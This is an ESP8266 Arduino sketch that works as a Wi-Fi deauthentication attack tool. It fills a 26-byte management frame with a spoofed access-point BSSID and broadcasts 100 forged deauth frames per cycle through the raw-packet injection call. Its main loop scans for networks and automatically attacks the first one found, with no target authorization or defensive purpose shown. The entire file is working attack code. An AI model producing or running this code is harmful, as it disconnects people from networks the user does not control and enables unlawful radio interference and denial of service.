#include <ESP8266WiFi.h>

/**
 * IEEE 802.11 Deauthentication Frame Structure
 *
 * Frame Format (26 bytes total):
 * - Frame Control (2 bytes): 0xC0 0x00 (Management frame, Deauthentication subtype)
 * - Duration (2 bytes): 0x00 0x00
 * - Destination Address (6 bytes): 0xFF... (Broadcast to all clients)
 * - Source Address (6 bytes): AP's BSSID (spoofed)
 * - BSSID (6 bytes): AP's BSSID
 * - Sequence Control (2 bytes): 0x00 0x00
 * - Reason Code (2 bytes): 0x01 0x00 (Unspecified reason)
 */
uint8_t packet[26] = {
    0xC0, 0x00,                          // Frame Control: Type=Management, Subtype=Deauthentication
    0x00, 0x00,                          // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: Broadcast address
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source: AP BSSID (will be filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP BSSID (will be filled)
    0x00, 0x00,                          // Sequence number
    0x01, 0x00                           // Reason code: Unspecified
};

/**
 * Inject deauthentication frames to target access point
 *
 * @param mac Target AP's BSSID (MAC address)
 * @param wifi_channel Target AP's WiFi channel (1-14)
 *
 * This function sets the ESP8266 to the target channel, copies the BSSID
 * into the packet structure, and injects 100 deauth frames using the
 * wifi_send_pkt_freedom() function which bypasses normal WiFi stack.
 */
void deauth(uint8_t *mac, uint8_t wifi_channel)
{
    // Set ESP8266 to target AP's channel
    wifi_set_channel(wifi_channel);

    // Copy target BSSID to Source Address field (offset 10)
    memcpy(&packet[10], mac, 6);

    // Copy target BSSID to BSSID field (offset 16)
    memcpy(&packet[16], mac, 6);

    // Inject 100 deauthentication frames
    for (int i = 0; i < 100; i++)
    {
        // Send raw 802.11 packet in promiscuous mode
        wifi_send_pkt_freedom(packet, 26, 0);
        delay(10);  // 10ms delay between frames
    }
}

void setup()
{
    Serial.begin(115200);
}

void loop()
{
    // Scan for available WiFi networks
    WiFi.scanNetworks();

    // Print first network's SSID to serial
    Serial.println(WiFi.SSID(0));

    // Execute deauth attack on first network found
    deauth(WiFi.BSSID(0), WiFi.channel(0));
}
